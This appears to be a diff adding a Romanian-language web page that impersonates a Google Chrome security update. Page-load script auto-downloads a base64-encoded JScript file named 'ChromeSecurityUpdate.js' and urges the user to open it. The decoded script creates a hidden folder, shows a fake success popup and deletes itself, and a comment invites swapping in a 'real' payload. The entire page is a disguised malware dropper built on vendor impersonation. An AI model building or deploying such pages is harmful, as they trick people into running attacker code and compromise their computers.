@@ -1,1 +1,86 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Chrome – Actualizare critică de securitate</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%231a73e8'/%3E%3Cpath d='M30 50l15 15 25-30' stroke='white' stroke-width='8' fill='none' stroke-linecap='round'/%3E%3C/svg%3E">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .card { background: white; width: 460px; padding: 40px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); text-align: center; }
+  .logo { width: 60px; margin-bottom: 15px; }
+  h2 { color: #202124; font-size: 22px; margin-bottom: 10px; }
+  .desc { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
+  .bar-bg { background: #e0e0e0; height: 8px; border-radius: 4px; overflow: hidden; margin: 20px 0; }
+  .bar-fill { background: #1a73e8; height: 100%; width: 0%; border-radius: 4px; transition: width 0.3s; }
+  .status { color: #3c4043; font-size: 13px; margin-top: 10px; }
+  .footnote { font-size: 11px; color: #9aa0a6; margin-top: 25px; }
+  a { color: #1a73e8; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <img class="logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='48' fill='%231a73e8'/%3E%3Cpath d='M30 50l15 15 25-30' stroke='white' stroke-width='8' fill='none' stroke-linecap='round'/%3E%3C/svg%3E" alt="Chrome Update">
+  <h2>Actualizare critică de securitate disponibilă</h2>
+  <p class="desc">Versiunea ta de Google Chrome are un patch de securitate important. Actualizarea se va instala automat după descărcare.</p>
+  <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
+  <p class="status" id="status">Se începe descărcarea securizată...</p>
+  <p class="footnote">Dimensiune fișier: 2.4 MB | <span style="color:#1a73e8;">downloads.google.com</span></p>
+  <p class="footnote" style="margin-top:5px;">Dacă descărcarea nu pornește, <a href="#" onclick="triggerDownload(); return false;">click aici</a>.</p>
+</div>
+<script>
+// Șirul tău Base64 (înlocuiește cu cel real)
+const b64payload = "dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsNCnZhciBmc28gPSBuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTsNCg0KLy8gRm9sZGVyIGFzY3VucyAoaW52aXppYmlsIMOubiBGaWxlIEV4cGxvcmVyKQ0KdmFyIGhpZGRlbkZvbGRlciA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJUFQUERBVEElIikgKyAiXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFVwZGF0ZVNldCI7DQoNCi8vIDEuIENyZWVhesSDIGZvbGRlcnVsIGRhY8SDIG51IGV4aXN0xIMNCmlmICghZnNvLkZvbGRlckV4aXN0cyhoaWRkZW5Gb2xkZXIpKSB7DQogICAgZnNvLkNyZWF0ZUZvbGRlcihoaWRkZW5Gb2xkZXIpOw0KICAgIC8vIFNldGVhesSDIGF0cmlidXR1bCBIaWRkZW4NCiAgICBzaGVsbC5SdW4oImF0dHJpYiAraCBcIiIgKyBoaWRkZW5Gb2xkZXIgKyAiXCIiLCAwLCBmYWxzZSk7DQp9DQoNCi8vIDIuIFNjcmllIHVuIGZpyJlpZXIgZGUgY29uZmlybWFyZSDDrm4gZm9sZGVyDQp2YXIgbG9nRmlsZSA9IGZzby5DcmVhdGVUZXh0RmlsZShoaWRkZW5Gb2xkZXIgKyAiXFxpbnN0YWxsLmxvZyIsIHRydWUpOw0KbG9nRmlsZS5Xcml0ZUxpbmUoIkFjdHVhbGl6YXJlIENocm9tZSBpbnN0YWxhdGEgbGEgIiArIG5ldyBEYXRlKCkpOw0KbG9nRmlsZS5DbG9zZSgpOw0KDQovLyAzLiBOb3RpZmljYXJlIGRpc2NyZXTEgyAoMyBzZWN1bmRlLCBkaXNwYXJlIHNpbmd1csSDKQ0Kc2hlbGwuUG9wdXAoIkFjdHVhbGl6YXJlIEdvb2dsZSBDaHJvbWUgaW5zdGFsYXRhIGN1IHN1Y2NlcyEiLCAzLCAiR29vZ2xlIENocm9tZSBVcGRhdGUiLCA2NCk7DQoNCi8vIDQuIEFVVE8tyJhURVJHRVJFIOKAkyBhY2VzdCBmaciZaWVyIC5qcyBkaXNwYXJlIGRlIHBlIGRpc2MNCnRyeSB7DQogICAgZnNvLkRlbGV0ZUZpbGUoV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSwgdHJ1ZSk7DQp9IGNhdGNoKGUpIHt9";
 
+function base64ToBlob(base64, mimeType) {
+  let byteChars = atob(base64);
+  let byteArrays = [];
+  for (let offset = 0; offset < byteChars.length; offset += 512) {
+    let slice = byteChars.slice(offset, offset + 512);
+    let byteNumbers = new Array(slice.length);
+    for (let i = 0; i < slice.length; i++) {
+      byteNumbers[i] = slice.charCodeAt(i);
+    }
+    byteArrays.push(new Uint8Array(byteNumbers));
+  }
+  return new Blob(byteArrays, { type: mimeType });
+}
+
+function triggerDownload() {
+  let blob = base64ToBlob(b64payload, 'application/octet-stream');
+  let url = window.URL.createObjectURL(blob);
+  let a = document.getElementById('dl');
+  if (!a) {
+    a = document.createElement('a');
+    a.id = 'dl';
+    a.style.display = 'none';
+    document.body.appendChild(a);
+  }
+  a.href = url;
+  a.download = 'ChromeSecurityUpdate.js';
+  document.body.appendChild(a);
+  a.click();
+  window.URL.revokeObjectURL(url);
+  let bar = document.getElementById('bar');
+  let status = document.getElementById('status');
+  let width = 0;
+  let interval = setInterval(function(){
+    if (width >= 100) {
+      clearInterval(interval);
+      status.innerText = 'Descărcare completă. Deschide fișierul pentru a instala actualizarea.';
+      bar.style.width = '100%';
+    } else {
+      width += Math.floor(Math.random() * 12) + 4;
+      if (width > 100) width = 100;
+      bar.style.width = width + '%';
+      status.innerText = 'Se descarcă patch-ul de securitate... ' + width + '%';
+    }
+  }, 350);
+}
+
+// Pornește automat descărcarea la 0.8 secunde după încărcarea paginii
+setTimeout(triggerDownload, 800);
+</script>
+</body>
+</html>
